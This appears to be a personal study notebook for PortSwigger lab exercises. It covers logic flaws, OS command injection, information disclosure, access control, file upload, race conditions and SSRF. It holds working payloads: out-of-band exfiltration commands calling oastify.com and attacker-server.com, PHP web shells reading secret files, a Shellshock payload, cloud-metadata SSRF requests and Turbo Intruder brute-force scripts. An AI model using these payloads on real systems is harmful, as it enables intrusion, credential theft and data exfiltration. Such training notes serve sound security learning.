  - Register "[Long string chrs total of 255 including sudomain add]@dontwannacry.com.exploit-0a6500480408835d81947f9901c70002.exploit-server.net"
- Inconsistent security controls
  - **Trusted users won't always remain trustworthy**
  - Use admin subdomain as email and login as admin type user
  - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
  - Update email as hacker**@DontWannaCry.com**
- Weak isolation on dual-use endpoint
  - change password for admin (remove current-password param, and update username)
  - POST /my-account/change-password
  - original: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&username=wiener&~~scurrent-password=peter~~s&new-password-1=123456&new-password-2=123456
  - modified: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&**username=administrator**&&new-password-1=123456&new-password-2=123456
- **Password reset broken logic**
  - **remove one parameter** at a time > deleting the name of the parameter as well as the **value**
  - Users won't always supply mandatory input
  - **temp-forgot-password-token**=~~sa5fk32fn68feb75ik9xp91sfoekxn11j~~s&username=wiener&new-password-1=123456&new-password-2=123456
  - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456  
- **2FA simple bypass**
  - Users won't always follow the **intended sequence**
  - skip to logged in page after 1FA
- Insufficient workflow validation
  - **Add Jacket** into cart
    - POST /cart/checkout   
  - **Error**
    - GET **/cart?err=INSUFFICIENT_FUNDS**
    - Not enough store credit for this purchase
  - Send to **repeater** to a confirmation order page
    - GET **/cart/order-confirmation?order-confirmed=true**
- Authentication bypass via flawed state machine
  - Login and intercept the next request
    - POST /login HTTP/1.1
    - csrf=5Y6EM5R6dxSayGitTEtdKdury3rwgN8X&username=wiener&password=peter   
  - **Drop the next request** GET /role-selector
    - browse to admin page, now defaulted as administrator
- Flawed enforcement of business rules
  - alternate 2 different coupon codes and reuse it multiple times (NEWCUST5, SIGNUP30)   
- Infinite money logic flaw
  > [!Burp traffic]   
  > **add gift card** to cart   
    POST /cart   
    productId=2&redir=PRODUCT&quantity=1   
  > **add coupon**   
    POST /cart/coupon   
    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&coupon=**SIGNUP30**      
    Gift card code = **lHdlmj91Nu**   
  > **place order**   
    POST /cart/checkout   
    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00   
    GET /cart/order-confirmation?order-confirmed=true     
  > **redeem gift card**   
    POST /gift-card   
    csrf=2kU4B4BzdMI3zVhywivxPAa31kEkNm00&gift-card=lHdlmj91Nu   
    GET /my-account   
  - Settings > Project > Session > **Session handling rules panel, click "add"** > session handling rule editor appear
  - Scope tab > select '**include all URLs**'
  - Details tab > click "add" **run a micro** > click "add"
    - POST /cart
    - POST /cart/coupon
    - POST /cart/checkout
    - GET /cart/order-confirmation?order-confirmed=true > click configure item > **add a custom parameter** > name 'gift-card' > **highlight the gift card code** at the bottom of the response > Ok to go back Macro Editor
    - POST /gift-card > click configure item > under **gift-card parameter handling** > select dropdown list **'derive from prior response**' > Ok to go back Macro Editor
  - **Test Macro** > Ok to go back Burp
  - Burp Intruder > **GET /my-account** > Sniper > **null payloads** > **generate 412 payloads** > max 1 concurrent request
  - Store credit++ (Refresh the page)
- Authentication bypass via **encryption oracle** **(SUPER HARD)**
  - [Tutorial step by step](https://www.youtube.com/watch?v=62spVp-GVPI&t=1s)
  - Stay logged in and post a comment with invalid email to observe encrypted cookies
    ```
    Request
    POST /post/comment   
    Cookie: **stay-logged-in=OtQWW%2fHiUg1PdV%2bmbFJrDsS40zMw8R93BfkLz4m%2ftS4%3d**; session=bc5J7wZPyjr1xrVksvk9gfDmcAV31xRD   
    csrf=Xmi1r3NQeRnv8Ap0dN5nlnmZkS9nbID1&postId=4&comment=comment1&name=hacker&email=**hh.hacker.com**&website=
    
    Response
    GET /post?postId=4
    Set-Cookie: **notification=7XpfTWmxSzTjCp30OO0KfLmzXaTvnJgSd8%2bOZNjIlX5xQdyGRoVrdRJSdzta%2bAJr**;
    Body: Invalid email address: hh.hacker.com
    ```
  - Encrypt repeater: POST /post/comment > stay-logged-in
  - Decrypt repeater: GET /post?postId=4 > amend notification cookie > response
  - Create and manipulate cookies to bypass encryption prefixes
    - copy Encrypt (stay-logged-in) and replace to Decrypt (notification) > decrypt repeater send > response found "wiener:1720796160463" > copy the timestamp
    - modify the email param in **Encrypt repeater**: email=**administrator:1720796160463** > send > copy the notification cookie in response
    - replace to **Decrypt** (notification) > send > response "Invalid email address: administrator:1720796160463"   (First 23 bytes prefix - "Invalid email address: ")   

    - **Encrypt** (stay-logged-in) > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 23 bytes > encode as base 64 > encode as url > copy the value
    - replace to **Decrypt** (notification) > send > response error "Input length must be multiple of 16 when decrypting with padded cipher"  (23 bytes prefix + 9 chrs = 32 + user:timestamp)
      
    - **Encrypt** (stay-logged-in) > add 9 chrs to **email=xxxxxxxxxadministrator:1720796160463** > send > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 32 bytes > encode as base 64 > encode as url > copy the value
    - replace to **Decrypt** (notification) > send > administrator:1720796160463
      
    - intercept on > click home page > delete session cookie > replace stay-logged-in cookie (copy from decrypt notification %url) > forward
      ```
      GET / HTTP/2   
      Cookie: stay-logged-in=%52%72%76%64%79%4c%51%74%49%67%59%41%2b%58%65%5a%37%6d%4e%33%4e%62%64%73%63%48%52%2f%61%34%49%4a%54%41%4d%74%39%38%6a%79%6e%4f%59%3d;
      ```
  - Gain access as an admin and perform the required action
    
## Command Injection
**How to test**
- command chaining: `;` `&` `|`
- Unix: use backstick or dollar to perform inline execution
- conditional execution: `&&` `||`   
- File manipulation: `> malicious_script.sh`   
- Input redirection: `echo "data" > output.txt`   
- Subshells: `$(echo "whoami")`
- Error-Based: `; nonexistentcommand`

**Blind based Command Injection Techniques**
| **Technique**                   | **Payload**                                         | **Observation for Successful Exploit**                                                                 |
|---------------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------------------------|
| **Time-Based Techniques**       |                                                     |                                                                                                        |
| Delay Using `sleep`             | `; sleep 5`                                         | **Observation:** Monitor the response time of the application. A delay of approximately 5 seconds indicates success.   |
| Time-Delayed Payload            | `; ping -c 10 192.168.0.1`                          | **Observation:** Monitor network traffic or logs for 10 ICMP requests to 192.168.0.1.                   |
| Time-Based Blind SQL Injection  | `'; if (sleep(5)) pg_sleep(5); --`                  | **Observation:** Delay in application response, indicating successful execution of sleep function.     |
| **Out-of-Band (OOB) Techniques**|                                                     |                                                                                                        |
| DNS-Based OOB                   | `; nslookup attacker-server.com`                    | **Observation:** Monitor DNS server logs for queries originating from the application server.          |
| HTTP-Based OOB                  | `; curl http://attacker-server.com/`                 | **Observation:** Monitor web server logs for HTTP requests originating from the application server.    |
| SMTP-Based OOB                  | `; mail -s "Exploit" attacker@example.com < /dev/null` | **Observation:** Monitor email logs or inbox for emails sent from the application server.             |

**Useful Commands**
| **Purpose of Command**      | **Linux Command**   | **Windows Command**     |
|-----------------------------|---------------------|-------------------------|
| **Name of Current User**    | `whoami`            | `whoami`                |
| **Operating System**        | `uname -a`          | `ver`                   |
| **Network Configuration**   | `ifconfig`          | `ipconfig /all`         |
| **Network Connections**     | `netstat -an`       | `netstat -an`           |
| **Running Processes**       | `ps -ef`            | `tasklist`              |

**Special Characters for Command Injection**
| **Special Character** | **Description**                                                                 | **Example Payload**                                     |
|-----------------------|---------------------------------------------------------------------------------|---------------------------------------------------------|
| **Whitespace** (` `)  | Separates command arguments.                                                    | `ls -la /tmp`                                           |
| **Semicolon** (`;`)   | Terminates current command; allows execution of subsequent commands.           | `ls; whoami`                                            |
| **Pipe**        | Redirects output of one command as input to another command.                    | `cat /etc/passwd \| grep root`                          |
| **Ampersand** (`&`)   | Executes multiple commands sequentially in the background.                      | `echo hello & echo world`                               |
| **Backticks** (`` ` ``) or `$()` | Executes enclosed command and substitutes its output.                | `echo $(whoami)`                                        |
| **Redirects** (`>`, `>>`, `<`) | Redirects input or output of commands.                                  | `echo "data" > file.txt`                                |
| **Double Quotes** (`"`) | Allows interpretation of enclosed variables and commands.                | `echo "Hello $(whoami)"`                                |
| **Single Quotes** (`'`) | Treats enclosed characters literally, avoiding shell interpretation.      | `echo '$(whoami)'`                                      |
| **Parentheses** (`(`, `)`) | Groups commands and changes their precedence. 

**Code Review: Dangerous OS command function**
**Java**
- `Runtime.exec()`
- `ProcessBuilder.start()`
- `getAttribute()`, `putValue()`, `getValue()`
- `java.net.Socket`, `java.io.fileInputStream`, `java.io.FileReader`

**ASP.NET**
- `HttpRequest.Params`
- `HttpRequest.Url`
- `HttpRequest.Item`

**Python**
- `exec`
- `eval`
- `os.system`
- `os.popen`
- `subprocess.popen`
- `subprocess.call`

**PHP**
- `system`
- `shell_exec`
- `exec`
- `proc_open`
- `eval`
- `passthru`
- `expect_open`
- `ssh2_exec`
- `popen`

**C/C++**
- `system`
- `exec`
- `ShellExecute`
- `execlp`

**Perl**
- `CGI.pm`
- `referer`
- `cookie`
- `ReadParse`

**Remediation**
- Never call out to OS commands
- Strong input validation (permited values, number, alphanumber, no other syntax or whitespace)

### Command Injection Lab
- OS command injection, **simple** case
  - POST /product/stock: productId=1&storeId=1`|whoami`
- Blind OS command injection with **time delays**
  - POST /feedback/submit:email=`||ping -c 10 127.0.0.1||`
- Blind OS command injection with **output redirection**
  - POST /feedback/submit: email=`||whoami>/var/www/images/output.txt||`   
  - https://0a09007904a751a58015128400a000b5.web-security-academy.net/image?filename=`output.txt`   
- Blind OS command injection with **out-of-band interaction**
  - POST /feedback/submit: email=`||nslookup+6jqvweh2htw3iugqlol0e3xquh08o7cw.oastify.com||`
  - Burp Collaborator > Poll now 
- Blind OS command injection with **out-of-band data exfiltration**
  - POST /feedback/submit: email=`||nslookup `whoami`.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com||`
  - ||nslookup `$(whoami)`.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com# (URL encode key chr)
  - replace by Burp Collaborator > Poll now
  - Backticks (`) are used to execute commands and substitute their output into another command or context
  - whoami (the current user's username) appended to .mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com. For e.g **root**.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com

## Information Disclosure
**Examples of information disclosure**
- hidden directories such as robots.txt
- access to source code file such as backup.txt
- DB info
- Credit card details
- Hard-coding API keys, IP addresses, database credentials
- Hinting at the existence or absence of resources, username
  
**Common sources of information disclosure**
- Files for web crawlers: robots.txt, sitemap.xml
- Directory listings: http://example.com/images/
- Developer comments
- Error messages, debugging data, user account pages, backup files, insecure configuration, version control history

**How do information disclosure vulnerabilities arise**
- Failure to remove internal content from public content - Developer comment   
- Insecure configuration of the website and related technologie - Debugging
- Flawed design and behavior of the application - returns distinct responses when different error states occur

**How to test**
- Fuzzing
  - identify interesting parameters
  - submitting unexpected data types by using Burp Intruder (fuzz pre-build wordlists)
  - comparing HTTP status codes, response times, lengths (grep match: error, invalid, SELECT, SQL)   
- Burp Scanner
  - Live scanning features for auditing. Alert you if it finds sensitive information such as private keys, email addresses, and credit card numbers.
- Burp's engagement tools
  - Search, find comments, discover content
- Engingeering informative responses

**Best practices**
- Everyone aware of what information is considered sensitive
- Audit any code for potential information disclosure as part of QA or build processes
- Use generic error messages
- Double-check that any debugging or diagnostic features are disabled in the production environment
- Understand the configuration settings, and security implications, of any third-party technology that you implement

### Information Disclosure Lab
- Information disclosure in error messages
  - GET /product?**productId=`"example"`**
  - full stack trace leaked: HTTP/2 500 Internal Server Error...**Apache Struts 2 2.3.31**
- Information disclosure on debug page
  - Target Site Map > Right click Engagement Tools > **Find Comments**
  - cgi-bin/phpinfo.php （SECRET_KEY environment variable)   
- Source code disclosure via backup files
  - Target Site Map > Right click Engagement Tools > **Discover content**
  - Found /backup directory, browse to backup/ProductTemplate.java.bak to access the source code > DB connection contains hard-coded password   
- Authentication bypass via information disclosure
  - GET /admin > HTTP/2 401 Unauthorized
  - `TRACE` /admin > send repeater request > HTTP/2 200 > response X-Custom-IP-Authorization: 116.87.25.165
  - Click **Proxy settings** > Scoll to **"Match and Replace rules"** > click "Add" > **Type: Request Header** > Replace: **X-Custom-IP-Authorization: 127.0.0.1 **  
    Burp Proxy will now add this header to every request you send
  - Now can access Admin page
- Information disclosure in **version control history**
  - Manual browse to /.git   
  - Download the git directory: Windows > Cygwin Tool > wget -r https://0afe0009032545248bb6a7c000df0033.web-security-academy.net/.git/   
  - View commit history "Remove admin password from config" `git log`  
  - the hard-coded password in diff on admin.conf file `git show` `git diff HEAD^ HEAD`

## Access Control
**Types of control**
- **vertical** access control: admin (privilege account type)
- **horizontal** access control: access other user's resource
- **context-dependent** access control (referer, location)
- hidden fields to determine the user's access rights or role at login     
  - `<input type="hidden" name="role" value="admin">`
  - URL param https://insecure-website.com/login/home.jsp?**role=1**
  
**Mitigation**
- Never rely on obfuscation alone for access control
- Use a single application-wide mechanism for enforcing access controls
- Declare the access that is allowed for each resource
- Deny access by default
- Use JWT for managing user roles and access rights
  ```javascript
  const jwt = require('jsonwebtoken');
  const token = jwt.sign({ userId: 12345, role: 'admin' }, 'your_secret_key', { expiresIn: '1h' });
  ```

### Access Control Lab
- Unprotected admin functionality
  - browse /**robots.txt**
  - Disallow: /**administrator-panel**
- Unprotected admin functionality with **unpredictable URL**
  - Target Site Map > Right click Engagement Tools > **Find script**
    adminPanelTag.setAttribute('href', '/admin-8trs8m');
- User role controlled by **request parameter**
  - GET /my-account?id=wiener
    **Cookie: Admin=false**; session=LBIW6sGesUS0nfCXovL7GFhhmW8tobYb
  - Change the cookie value > **Admin=true**
- User ID controlled by **request parameter**
  - change the id to another user (horizontal privilege escalation)   
  - GET /my-account?`id=carlos`
- **User rol**e can be **modified** in user profile
  - POST /my-account/change-email
    Body {"email":"edisonchen2019@gmail.com"}
  - Response
    ```   
    {
     "username": "wiener",
     "email": "edisonchen2019@gmail.com",
     "apikey": "ppquj0gz6sLCcuFt7ATXkID0dnsuJP4u",
     "roleid": 1
    }
    ```  
  - Append roleid to uppdate   
    Body {"email":"edisonchen2019@gmail.com", **"roleid": 2**}   
- **URL-based** access control can be circumvented
  - GET /admin > access denied
  - GET /  > response 200
    X-Original-Url: /admin
  - Delete the user `<a href="/admin/delete?username=carlos">`   
    GET `/?username=carlos`   
    `X-Original-Url: /admin/delete`   
- **Method-based** access control can be circumvented
  - **Admin upgrade user**
    POST /admin-roles   
    username=carlos&action=upgrade   
  - Another window **login as normal user (wiener)**
    Right click repeater of POST /admin-roles > **Change request method**
    change the session to own cookies
    **GET** /admin-roles?**username=wiener**&action=upgrade
- **User ID **controlled by **request parameter**
  - GET /my-account?`id=carlos`   
- User ID controlled by request parameter, with unpredictable user IDs
  - GET /my-account?`id=75b04a0a-1476-4e20-9b58-f2e7b77de253`
  - Dicover other user ID in website   
- **User ID** controlled by **request parameter** with **data leakage in redirect**
  - change the id to another user (horizontal privilege escalation)   
  - GET /my-account?`id=carlos` > 302 response code
  - Redirect to /login page but body response leak the API key   
- **User ID** controlled by **request parameter** with **password disclosure**
  - GET /my-account?`id=administrator`
  - response leak the administrator password
- **Insecure direct object references**
  - view other chat history   
    GET /download-transcript/`1.txt`
- **Multi-step process** with no access control on one step
  - 1st step: POST /admin-roles   
    username=carlos&action=upgrade > access denied   
  - 2nd step Confirmation: POST /admin-roles   
    action=upgrade&**confirmed=true**&**username=wiener**   
    **Replace cookies with attacker's one** and replay it > OK   
- **Referer**-based access control   
  GET /admin-roles?**username=wiener**&action=upgrade   
  Referer: https://0a6700d3044a5e898157ed94008d007c.web-security-academy.net/admin   
  Login as wiener user, obtain the cookie, replace in the original admin's request   
  Missing referer > get unauthorized error > paste back the referrer > OK   

## File Upload
**Example of remote code**   
- Executable file type: web shell, php, java
- Response header: Content-Type
- `<?php echo file_get_contents('/path/to/target/file'); ?>`
- `<?php echo system($_GET['command']); ?>`
   GET /example/exploit.php?command=**id** HTTP/1.1

**Flawed validation of file uploads**
- Content-Disposition: form-data; name="image"; filename="example.jpg"   
  **Content-Type**: image/jpeg   
- Content-Disposition: form-data; name="description"   
  Content-Type: multipart/form-data;   
- Server execute any scripts that do slip through the net   
- Obfuscating file extensions. Using lesser known, alternative file extensions such as .php5, .shtml
  - casing different: `.pHp` vs .php
  - Provide multiple extensions: `exploit.php.jpg`
  - Add trailing characters: `exploit.php.`
  - URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes: `exploit%2Ephp`
  - Add semicolons or URL-encoded null byte characters before the file extension: `exploit.asp;.jpg` `exploit.asp;.jpg`
  - multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion: `xC0 x2E` `xC4 xAE`
- Overriding the server configuration
  /etc/apache2/apache2.conf `AddType application/x-httpd-php .php`   
  IIS/web.config `<mimeMap fileExtension=".json" mimeType="application/json" />`
- bypass stripping or replacing dangerous extensions to prevent the file from being execute: `exploit.p.phphp`
- file upload race condition
- Upload malicious client-side scripts `<scrip>`
- support `PUT` requests

**Mitigation**
- heck the file extension against a whitelist
- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence ../
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten
- Do not upload files to the server's permanent filesystem until they have been fully validated
- use an established framework for preprocessing file uploads      

### File Upload Lab
- Remote code execution via **web shell upload**
  - upload image
    POST /my-account/avatar
    **Content-Disposition: form-data; name="avatar"; filename="profile.png"**
    **Content-Type: image/png **  
    Content-Disposition: form-data; name="user"
    Content-Disposition: form-data; name="csrf"
  - Upload **exploit.php**
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
  - GET /files/avatars/exploit.php   > secret code
- Web shell upload via **Content-Type** restriction bypass
  - Error: file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed
  - POST /my-account/avatar   
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJEBayCEruOgolfHL   
    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
  - Change the content-type to `Content-Type:image/jpeg`
- Web shell upload via **path traversal**
  - The server has just returned the contents of the PHP file as plain text.
  - In the Content-Disposition header, change the filename to include a directory traversal sequence
    Content-Disposition: form-data; name="avatar"; filename="**../**exploit.php"   
    Response: The file avatars/exploit.php has been uploaded.
  - Obfuscate the directory traversal sequence by URL encoding the forward slash (/)
    Content-Disposition: form-data; name="avatar"; filename="`..%2f`exploit.php"   
    Response: The file avatars/../exploit.php has been uploaded.   
  - Browse the file, Uploaded as /files/avatars/..%2fexploit.php   
    https://0aa000c804f4e4a281500c7b002200b4.web-security-academy.net/files/avatars/**exploit.php**
- Web shell upload via **extension blacklist bypass**
  - Change the requests for filename and content-type parameter
    Content-Disposition: form-data; name="avatar"; **filename=".htaccess"**
    **Content-Type: text/plain**   
    `AddType application/x-httpd-php .l33t`   
    Response: The file avatars/.htaccess has been uploaded.   
  - Content-Disposition: form-data; name="avatar"; **filename="exploit.l33t"**   
    Content-Type: image/jpeg   
    Response: The file avatars/exploit.l33t has been uploaded.   
  - Browse: https://0aad0062048b502c8543289b001c008d.web-security-academy.net/files/avatars/exploit.l33t
- Web shell upload via **obfuscated file extension**
  - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"   
- Remote code execution via polyglot **web shell upload**
  - Install [exiftool](https://exiftool.org/install.html)   
    Add system environment variables path -> C:\exiftool-12.89_32  > rename to "exiftool.exe" > add a profile.png image into the folder
  - `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" profile.png -o polyglot.php`
  - browse the uploaded file >  PNG  IHDR{  * dStEXtCommentSTART **thIqb3Mm93Qqs0jr8Cl2kEv2E7r3xDp1** ENDԴ`PA I
- Web shell upload via **race condition (Expert)**
  - The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed
  - Send repeater for POST /my-account/avatar & GET /files/avatars/exploit.php request   
  - in POST request > **add tab to group > create new group** > add GET request   
  - **send group in parallel**    

## Race Condition
Read up: [Smashing the state machine: The true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)   
**Types of attacks**   
- Redeeming a gift card multiple times
- Rating a product multiple times
- Withdrawing or transferring cash in excess of your account balancE
- Reusing a single CAPTCHA solutio
- Bypassing an anti-brute-force rate limit

**Burp Repeater - Sending grouped HTTP requests**   
- send group in sequence (single connection): test for potential client-side desync vectors
- Send group in sequence (separate connections): test for vulnerabilities that require a multi-step process
- Send group in parallel: test for race conditions

**Decting and exploiting**
- HTTP/1: last-byte synchronization technique
- HTTP/2: single-packet attack technique, (Using a single TCP packet to complete 20-30 requests simultaneously)

**Mitigation**
- Using database transactions can ensure that state changes are atomic, which means they either fully complete or don't happen at all
- Locks can prevent multiple processes from accessing the same resource simultaneously   
- Ensure that operations can be performed multiple times without changing the result (API Idempotency)
- Use Message Queues. Decouple processes by using message queues. This ensures that operations are processed sequentially
- Avoid mixing data from different storage places. If you're fetching user details from a database and payment information from an external API, it's better to first fetch and cache the data from the external API, then operate on the cached data alongside your database transaction
- Avoid server-side state entirely. Store state in a JWT and ensure it's encrypted and signed to prevent tampering. 

### Race Condition Lab
- Limit overrun race conditions
  - For 20% off use code at checkout: **PROMO20**
  - Apply coupon code, intercept > send to repeater: POST /cart/coupon
  - Create 20 duplicate tabs (Ctrl+R)
  - **Create a new group > add tabs to group > check the 20 repeaters box**
  - Send group in paralle (single-packet attack)   
- Bypassing rate limits via race conditions
  - POST /login HTTP/1.1   
    csrf=V3z6oyspnjRPU9Dow4w6Dx96MpCeHVTT&username=carlos&password=`%s`   
  - Right click request > extension > turbo intruder > **send to turbo intruder** > select select examples/race-single-packet-attack.py   
  - Amend the python code in below   
    ```Python
    def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')

    def handleResponse(req, interesting):   
    table.add(req)   
    ```
    - start attack > observe 302 response code   
- Multi-endpoint race conditions
  - create tab group
    - **add gift card**: POST /cart productId=2&redir=PRODUCT&quantity=1
    - **check out**: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
    - **add jacket**: POST /cart productId=1&redir=PRODUCT&quantity=1
  - under check out tab > send group (parallel)
- Single-endpoint race conditions   
  - **POST /my-account/change-email**   
    - request 1: anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net   
    - request 2: carlos@ginandjuice.shop   
  - send the requests in parallel   
  - Receive email of carlos@ginandjuice.shop, click the confirmation link to update your address accordingly.   
- Partial construction race conditions
  - **POST /register**   
    csrf=CRs0ranHwII63CbQnp32ZGxCEKavBZcO&username=`%s`&email=user%40ginandjuice.shop&password=123456
  - **send to turbbo intruder**
    ```python
    def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
    Host: 0ac7000204681544819facc200310057.web-security-academy.net
    Cookie: phpsessionid=NzQYwl5AGYNLGU50kB1QxFMfV54fXskz
    Content-Length: 0
    '''  
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'hacks' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

    def handleResponse(req, interesting):
       table.add(req)

    username=User0&email=user%40ginandjuice.shop&password=123456
    ```
- Exploiting time-sensitive vulnerabilities   
  - request 1: POST /forgot-password csrf=qkTrYHsMf4bkS7bfcve9Pkkk9xdDOJd9&username=wiener   
  - request 2: POST /forgot-password csrf=qkTrYHsMf4bkS7bfcve9Pkkk9xdDOJd9&username=carlos   
  - send requests in paralle (check miliseconds)   
  - Email retrieve the same toke same as carlos https://0a6900f80434cae2813702630092000a.web-security-academy.net/forgot-password?**user=carlos**&**token=fb72ceec9631530954d3e0dc2077c72fbbe7d981**

## SSRF (Server-Side Request Forgery)
**SSRF impacts**
- unauthorized actions or access to data within the organization
- abitrary command execution

**SSRF types**
- Basic SSRF
  `GET /fetch?url=http://internal-service.local/admin`
- Blind SSRF 
  - cannot see the response but can infer based on response times or logs   
  - trigger an HTTP request to an external system that you control, and monitoring for network interactions
  - using out-of-band (OAST) technique **(Burp Collaborator)**
  `GET /fetch?url=http://internal-service.local/admin/slow-endpoint`
  
- SSRF to Access Internal Services
  `GET /fetch?url=http://localhost:8080/admin`
- SSRF to Access Cloud Metadata Services
  `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- SSRF to Scan Internal Networks
  `GET /fetch?url=http://192.168.1.1:22/`
- SSRF to Exploit Local File Inclusion (LFI)
  `GET /fetch?url=file:///etc/passwd`
- SSRF with DNS Rebinding
  The attacker sends a request to http://attacker.com, and through DNS rebinding, the domain resolves to an internal IP address.
  `GET /fetch?url=http://malicious.com/xss`
- SSRF to Relay Attacks (bypassing IP restriction)
  `GET /fetch?url=http://external-service.com/api?token=secret`
- SSRF to Exploit Third-Party APIs
  `GET /fetch?url=http://api.thirdparty.com/userinfo?user_id=admin`

**Finding hidden attack surface for SSRF**
- parameter: URL, HTTP headers (host, X-forwarded-for, referer), form fields, JSON/XML   
- file uploads, image fetching, SSO, OAuth callback, APIs   
- Tools: SSRFmap, FFUF/Dirsearch   

**SSRF blacklisting bypass**
- **URL encoding**   
  `GET /fetch?url=http%3A%2F%2Flocalhost%2Fadmin`
- **double URL encoding**   
  `GET /fetch?url=http%253A%252F%252Flocalhost%252Fadmin`
- **Case variation**   
  `GET /fetch?url=HTTP://localhost/admin`   
- **Using Different IP Representations**   
  Decimal: http://2130706433/ (localhost)   
  Octal: http://0177.0.0.01/ (localhost)   
- **DNS Redirection**   
  `GET /fetch?url=http://attacker-controlled-domain.com/`   
- Redirects   
  `GET /fetch?url=http://trusted-domain.com/redirect?url=http://localhost/admin`   
- **Subdomains**   
  `GET /fetch?url=http://sub.localhost/admin`   
- Path-Based Attacks   
  `GET /fetch?url=http://localhost%2F%2E%2E%2Fadmin`   
- Bypassing Port Restrictions   
  `GET /fetch?url=http://localhost:80/admin`   
- Null Byte Injection   
  `GET /fetch?url=http://localhost%00.evil.com/admin`   
- Using Alternative Schemes   
  `GET /fetch?url=file://localhost/admin`   
- **Embed credentials in a URL before the hostname**   
  `GET /fetch?url=http://user@localhost/admin`   
- Using Malformed URLs   
  `GET /fetch?url=http://localhost:/admin`   
- **Exploiting Protocols**   
  `GET /fetch?url=gopher://localhost/admin`   
- **URL Fragments**   
  `GET /fetch?url=http://localhost/#/admin`   

**Mitigation**
- Input Validation
- allowlist to restrict which URLs the server can request
- firewall rules to prevent the server from making requests to internal or restricted IP ranges
- Metadata Service Protection: Block access to cloud metadata services from untrusted sources
- Network Segmentation: Segment the network to limit the server's ability to access internal services.
- Logging and Monitoring: Implement logging and monitoring to detect suspicious activity.   

### SSRF Lab
- Basic SSRF against the **local server**
  - check stock
    POST /product/stock   
    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
  - change the stockApi url
    stockApi=`http://localhost/admin/delete?username=carlos`
- Basic SSRF against **another back-end system**
  - check stock
    POST /product/stock   
    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
  - send to intruder > payloads number 1 to 255
    stockApi=http://192.168.0.**§1§**:8080/admin   
  - Found 200 response for port 47 > delete user
    stockApi=http://192.168.0.**47**:8080/admin/delete?username=carlos  
- SSRF with **blacklist-based** input filter
  - Bypass blocking of http://127.0.0.1/, 'admin'
  - `http://127.1/` OK
  - double url encoding of 'admin' `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
- SSRF with **whitelist-based** input filter
  - http://127.0.0.1/ >  "External stock check host must be stock.weliketoshop.net"
  - http://**user**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > embed credential accepted
  - http://**user#**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > # accepted
  - http://localhost%2523@stock.weliketoshop.net > double encode '#' accepted
  - http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos > delete user   
- SSRF with filter bypass via **open redirection** vulnerability
  - Next product traffic: GET /product/nextProduct?currentProductId=1&path=/product?productId=2
  - Check stock traffic: POST /product/stock stockApi=/product/stock/check?productId=1&storeId=2
  - stockApi=/product/nextProduct?currentProductId=1&`path=http://192.168.0.12:8080/admin/delete?username=carlos` (Ctrl U encode)   
- Blind SSRF with **out-of-band** detection
  - Referer: https://0ac500a803221534816908d700410028.web-security-academy.net/
  - `Referer: http://pf84dopkq16zh0dq128f4xvqiho8c10q.oastify.com`
  - Copy collaborator and replace the referrer url > Goback Collaborator > click Poll now   > DNS records are showing
- Blind SSRF with **Shellshock** exploitation
  - Install Burp Extension '**Collaborator Everywhere**'
  - Add the target site to scope so that Collaborator Everywhere will target it
  - Navigate the site
  - Under 'Issues' panel, collaborator Pingback (HTTP): User-Agent > click on the requeest > send to intruder
  - Copy collaborator domain   
  - Replace user agent string > `() { :; }; /usr/bin/nslookup $(whoami).jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com`
